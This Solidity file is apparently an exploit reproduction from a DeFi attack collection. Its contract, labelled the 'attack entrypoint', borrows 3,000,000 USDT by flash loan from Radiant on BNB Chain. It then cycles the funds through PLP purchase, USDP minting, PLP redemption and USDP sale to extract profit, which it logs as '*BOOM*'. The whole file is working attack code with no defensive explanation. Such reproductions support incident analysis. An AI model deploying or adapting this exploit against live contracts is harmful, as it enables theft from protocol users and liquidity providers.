import {RuinLocation} from "./ruins/RuinLocation.sol";

import {IERC20} from "../../interfaces/tokens/IERC20.sol";
import {IRadiantLendingPoolFlashloan} from "../../interfaces/flashloan/radiant/IRadiantLendingPoolFlashloan.sol";
import {IRadiantLendingPoolFlashloanReceiver} from "../../interfaces/flashloan/radiant/IRadiantLendingPoolFlashloanReceiver.sol";

import {
    RADIANT_LENDING_POOL,
    BSC_USD as USDT
} from "../../constants/bsc.sol";

import "forge-std/console.sol";

interface IPLPLiquidityEvent {
    function unstakeAndRedeemPlp(
        uint256 _plpAmount,
        uint256 _minOut,
        address _receiver
    ) external returns (uint256);

    function purchasePlp(
        uint256 _amountIn,
        uint256 _minUsdp,
        uint256 _minPlp
    ) external returns (uint256 amountOut);
}

interface IPLPVault {
    function buyUSDP(address _receiver) external returns (uint256);

    function sellUSDP(address _receiver) external returns (uint256);
}

contract Shaman is RuinLocation, IRadiantLendingPoolFlashloanReceiver {
    function peek() external {}

    // attack entrypoint
    function beat() external {
        IERC20(USDT).approve(RADIANT_LENDING_POOL, type(uint256).max);

        // step 1: borrow USDT from Radiant with flashloan
        address[] memory _assets = new address[](1);
        _assets[0] = USDT;
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 3000000000000000000000000;
        uint256[] memory _modes = new uint256[](1);

        IRadiantLendingPoolFlashloan(RADIANT_LENDING_POOL).flashLoan(
            address(this), _assets, _amounts, _modes, address(this), "ff", 0);

        console.log("[>*BOOM*<] Profit = %s USDT", IERC20(USDT).balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {

        IERC20(PLP).approve(FEE_PLP, type(uint256).max);
        IERC20(USDT).approve(PLP_MANAGER, type(uint256).max);
        uint256 _shares = IPLPLiquidityEvent(PLP_LIQUIDITY_EVENT).purchasePlp(1000000000000000000000000, 0, 0);

        IERC20(USDT).transfer(PLP_VAULT, 2000000000000000000000000);
        uint256 _usdpBought = IPLPVault(PLP_VAULT).buyUSDP(address(this));

        IPLPLiquidityEvent(PLP_LIQUIDITY_EVENT).unstakeAndRedeemPlp(
            _shares, 0, address(this));

        IERC20(USDP).transfer(PLP_VAULT, _usdpBought * 983 / 1000);
        IPLPVault(PLP_VAULT).sellUSDP(address(this));
        
        return true;
    }
}